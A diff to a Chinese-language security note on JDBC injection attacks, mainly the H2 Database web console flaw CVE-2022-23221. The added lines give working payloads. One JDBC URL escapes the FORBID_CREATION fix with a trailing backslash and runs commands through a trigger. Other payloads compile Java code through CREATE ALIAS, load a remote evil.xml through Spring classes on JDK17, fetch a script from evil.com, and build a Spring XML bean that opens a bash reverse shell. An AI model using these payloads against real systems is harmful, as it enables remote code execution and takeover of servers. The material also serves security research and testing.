@@ -62,13 +62,44 @@ H2控制台依然支持JNDI注入:
 
 ### CVE-2022-23221: H2 Database Web Console未授权JDBC攻击导致远程代码执行
 
-尽管在1.4.198版本中不允许创建新数据库 但可以通过可控的`JDBC URL` 进行JDBC注入攻击
+尽管在1.4.198版本中不允许创建新数据库 修复方式追加属性`FORBID_CREATION=TRUE` 即禁止创建数据库:
+
+默认ifExists=true时 追加属性`databaseUrl += ";FORBID_CREATION=TRUE"`
+
+在JDBC参数解析使用`;`分割 而且支持`\`转义 为了方便执行多行sql语句
+
+可以在JDBC URL字符串最末尾增加一个`\`转义`;FORBID_CREATION=TRUE`最前面的`;` 让这个属性失效:
+
+```text
+jdbc:h2:mem:test;MODE=MSSQLServer;IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;INIT=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
+    java.lang.Runtime.getRuntime().exec("calc.exe")
+$$;XXX=\
+```
+
+但可以通过可控的`JDBC URL` 进行JDBC注入攻击
 
 H2的URL标准格式通常为：`jdbc:h2:[file:|mem:|tcp:]<databaseName>;<key1>=<value1>;<key2>=<value2>...`
 
 `org.h2.Driver`支持`INIT`参数 来执行初始化SQL:
 
 `jdbc:h2:mem:test;MODE=MSSQLServer;INIT=RUNSCRIPT FROM 'http://evil.com/setup.sql'`
+
+> 这里引用外部sql为了方便执行多条语句 在无外网权限下 使用`;`执行多条语句
+
+> 这里分号使用`\`转义 避免被解析成jdbc参数
+
+编译执行java代码:
+
+```java
+CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws 
+java.io.IOException {Runtime.getRuntime().exec(cmd);return 
+"test";}';
+CALL EXEC ('open -a Calculator.app');
+```
+
+> 注意使用jre运行的环境 是没有javac命令的 无法编译ALIAS中的java代码
+
+
 
 在无法访问外网的情况 如果环境存在Groovy依赖 可通过编译Groovy语句时执行Java代码:
 
@@ -86,6 +117,26 @@ jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON IN
     java.lang.Runtime.getRuntime().exec('cmd /c calc.exe')
 $$
 ```
+
+#### JDK17 下的利用
+
+JDK高版本删除JavaScriptEngine H2提供一套直接引用已编译的静态方法机制:
+
+允许Java静态方法 Class和Method必须声明public
+
+```sql
+CREATE ALIAS CLASS_FOR_NAME FOR 'java.lang.Class.forName(java.lang.String)';
+CREATE ALIAS NEW_INSTANCE FOR 'org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])';
+
+SET @url_str='http://evil:8000/evil.xml';
+SET
+
+@context_clazz=CLASS_FOR_NAME('org.springframework.context.support.ClassPathXmlApplicationContext');
+SET @string_clazz=CLASS_FOR_NAME('java.lang.String');
+
+CALL NEW_INSTANCE(@context_clazz, ARRAY[@string_clazz], ARRAY[@url_str]);
+```
+
 
 ## Derby内嵌数据库 
 
@@ -261,7 +312,19 @@ driver:`com.ibm.db2.jcc.DB2Driver`
 
 控制configLocation远程xml 达到SSRF/XXE效果
 
-在xml中可构造bean触发解析SPEL表达式:
+在xml中可构造bean触发解析SPEL表达式或直接执行命令:
+
+```xml
+<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+    <constructor-arg>
+        <list>
+            <value>bash</value>
+            <value>-c</value>
+            <value><![CDATA[bash -i >& /dev/tcp/host/4444 0>&1]]></value>
+        </list>
+    </constructor-arg>
+</bean>
+```
 
 ### log文件写入
 
